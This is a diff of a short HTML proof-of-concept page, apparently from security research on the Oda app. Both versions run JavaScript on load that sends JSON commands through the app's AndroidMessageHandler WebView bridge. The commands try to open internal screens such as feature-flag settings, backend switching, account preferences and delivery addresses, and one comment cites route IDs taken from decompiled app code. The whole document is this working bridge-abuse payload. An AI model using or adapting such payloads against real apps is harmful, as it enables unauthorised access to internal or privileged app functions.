@@ -1,28 +1,25 @@
-<html>
-<body>
-     <h1>Oda Security Research</h1>
-     <p>Testing Bridge to Internal Screens...</p>
-     <script>
-         function trigger(payload) {
-             if (window.AndroidMessageHandler) {
-                 AndroidMessageHandler.postMessage(JSON.stringify(payload));
-             }
-         }
-
-         setTimeout(function() {
-             // Percobaan 1: Menggunakan skema kolonialno
-             trigger({"command":"open-native-url", "url":"kolonialno://android_native/feature_flag"});
-
-             // Percobaan 2: Menggunakan ID screen langsung (jika bridge mendukung)
-             setTimeout(function() {
-                 trigger({"command":"open-native-url", "url":"feature_flag_setting_screen"});
-             }, 1000);
-
-             // Percobaan 3: Mencoba membuka Survey dengan URL internal
-             setTimeout(function() {
-                 trigger({"command":"open-survey", "jsonUrl":"kolonialno://android_native/change_backend"});
-             }, 2000);
-         }, 1000);
-     </script>
-</body>
-</html>
+1 <html>
+    2 <body>
+    3     <h1>Oda Security Audit</h1>
+    4     <script>
+    5         setTimeout(function() {
+    6             if (window.AndroidMessageHandler) {
+    7                 // Mencoba membuka layar internal Account Preferences
+    8                 // Route ID didapat dari analisa ib.C4170s0
+    9                 window.AndroidMessageHandler.postMessage(JSON.stringify({
+   10                     "command": "open-native-url",
+   11                     "url": "account_preferences_screen"
+   12                 }));
+   13
+   14                 // Backup: Mencoba membuka layar Delivery Address
+   15                 setTimeout(function() {
+   16                     window.AndroidMessageHandler.postMessage(JSON.stringify({
+   17                         "command": "open-native-url",
+   18                         "url": "delivery_address_screen"
+   19                     }));
+   20                 }, 1000);
+   21             }
+   22         }, 1000);
+   23     </script>
+   24 </body>
+   25 </html>
